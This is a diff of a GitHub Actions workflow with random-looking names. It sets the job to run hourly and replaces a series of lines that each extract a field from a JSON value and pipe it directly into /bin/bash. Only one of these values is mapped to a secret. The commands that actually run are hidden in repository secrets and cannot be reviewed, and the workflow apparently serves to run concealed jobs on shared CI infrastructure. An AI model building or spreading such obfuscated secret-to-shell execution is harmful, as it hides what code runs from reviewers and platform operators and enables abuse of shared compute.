@@ -2,28 +2,29 @@ name: fuhongxue9521
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 1/6 * * *'
+    - cron: '52 * * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fuhongxue9521
         env:
-          ntrky4610: ${{ secrets.ntrky4610 }}
+          eh17708: ${{ secrets.eh17708 }}
         run: |
-          echo $ntrky4610 | jq -r .j3722 | /bin/bash
-          echo $gt500 | jq -r .qdlbs9239 | /bin/bash
-          echo $t07 | jq -r .dvd28292 | /bin/bash
-          echo $zppf10 | jq -r .pnjx1 | /bin/bash
-          echo $zcue77324 | jq -r .ml892 | /bin/bash
-          echo $rad926 | jq -r .jr7575 | /bin/bash
-          echo $ztqr4 | jq -r .sdp924 | /bin/bash
-          echo $hdd1608 | jq -r .gl9056 | /bin/bash
-          echo $d94 | jq -r .xavb716 | /bin/bash
-          echo $q04314 | jq -r .dxcug6 | /bin/bash
-          echo $k7558 | jq -r .zact9 | /bin/bash
-          echo $o5625 | jq -r .o12391 | /bin/bash
-          echo $ccmko07525 | jq -r .xoqsj720 | /bin/bash
+          echo $eh17708 | jq -r .hqym9 | /bin/bash
+          echo $w2 | jq -r .q430 | /bin/bash
+          echo $m163 | jq -r .azg3867 | /bin/bash
+          echo $lazq5 | jq -r .yy61664 | /bin/bash
+          echo $wavpu45437 | jq -r .ucmqx018 | /bin/bash
+          echo $mxmme56 | jq -r .fuf872 | /bin/bash
+          echo $ohd39882 | jq -r .snscy6075 | /bin/bash
+          echo $kjd7928 | jq -r .dbxic67774 | /bin/bash
+          echo $eyjj80014 | jq -r .m84076 | /bin/bash
+          echo $rje82112 | jq -r .dpini1 | /bin/bash
+          echo $hlwml25149 | jq -r .pt014 | /bin/bash
+          echo $cac545 | jq -r .dpjpb3 | /bin/bash
+          echo $flvv3 | jq -r .xtzee830 | /bin/bash
+          echo $hr15 | jq -r .atmff8 | /bin/bash
+          echo $znkkd31984 | jq -r .n893 | /bin/bash
 
